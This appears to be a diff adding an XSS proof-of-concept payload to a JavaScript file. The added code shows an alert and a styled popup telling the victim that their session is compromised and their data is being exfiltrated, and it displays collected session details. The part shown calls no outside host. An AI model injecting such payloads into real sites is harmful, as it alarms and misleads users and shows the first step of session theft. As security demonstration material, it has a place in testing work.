@@ -22,6 +22,54 @@ const details = `
   ⏳ Timestamp: ${new Date().toISOString()}
 `;
 
+// Show pop-up alert immediately
+alert("🚨 XSS Alert: Your session has been compromised! 🚨");
+
+// Create a more visually appealing pop-up
+function createCustomPopup() {
+    // Create popup container
+    const popupContainer = document.createElement('div');
+    popupContainer.style.cssText = `
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    background-color: #f8d7da;
+    border: 2px solid #dc3545;
+    border-radius: 8px;
+    padding: 20px;
+    box-shadow: 0 0 20px rgba(0,0,0,0.5);
+    z-index: 10000;
+    width: 80%;
+    max-width: 500px;
+    font-family: Arial, sans-serif;
+  `;
+
+    // Create popup content
+    const popupContent = document.createElement('div');
+    popupContent.innerHTML = `
+    <h2 style="color: #dc3545; text-align: center; margin-top: 0;">⚠️ Security Alert ⚠️</h2>
+    <p style="font-size: 16px; margin-bottom: 15px;">Your session has been compromised and your data is being exfiltrated:</p>
+    <div style="background-color: #f1f1f1; padding: 10px; border-radius: 4px; max-height: 200px; overflow-y: auto; font-family: monospace; font-size: 12px;">
+      ${details.replace(/\n/g, '<br>').replace(/ /g, '&nbsp;')}
+    </div>
+    <div style="text-align: center; margin-top: 15px;">
+      <button id="close-popup" style="padding: 8px 16px; background-color: #dc3545; color: white; border: none; border-radius: 4px; cursor: pointer;">Close</button>
+    </div>
+  `;
+
+    popupContainer.appendChild(popupContent);
+    document.body.appendChild(popupContainer);
+
+    // Add event listener to close button
+    document.getElementById('close-popup').addEventListener('click', function() {
+        document.body.removeChild(popupContainer);
+    });
+}
+
+// Show custom popup after a short delay
+setTimeout(createCustomPopup, 500);
+
 // Log details to console for debugging
 console.log(details);
 
